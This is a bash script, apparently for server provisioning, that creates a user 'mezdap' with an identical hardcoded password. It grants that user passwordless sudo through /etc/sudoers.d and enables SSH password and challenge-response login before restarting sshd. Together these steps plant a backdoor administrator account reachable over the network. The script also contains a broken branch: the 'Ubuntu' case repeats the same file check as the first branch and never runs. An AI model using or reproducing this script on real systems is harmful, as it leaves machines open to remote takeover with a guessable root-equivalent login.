#!/bin/bash

# Check if script is being run as root
if [ "$(id -u)" -ne 0 ]; then
  echo "This script must be run as root" >&2
  exit 1
fi

# Define variables
NEW_USER="mezdap"
PASSWORD="mezdap"

# Add user
useradd -m "$NEW_USER"

# Set password for the new user
echo "$NEW_USER:$PASSWORD" | chpasswd

# Add the user to the sudo group
usermod -aG sudo "$NEW_USER"

# Configure passwordless sudo
echo "$NEW_USER ALL=(ALL) NOPASSWD:ALL" > "/etc/sudoers.d/$NEW_USER"

# Enable SSH password authentication, pubkey authentication, and ChallengeResponseAuthentication
if [ -f /etc/ssh/sshd_config ]; then
    # CentOS
    sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
    sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
    sed -i 's/#ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config
elif [ -f /etc/ssh/sshd_config ]; then
    # Ubuntu
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
    sed -i 's/PubkeyAuthentication no/PubkeyAuthentication yes/' /etc/ssh/sshd_config
    sed -i 's/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config
fi

# Restart SSH service to apply changes
service ssh restart
systemctl restart sshd

echo "User '$NEW_USER' has been created and added to sudoers with passwordless sudo access."
echo "SSH password authentication, public key authentication, and ChallengeResponseAuthentication have been enabled."
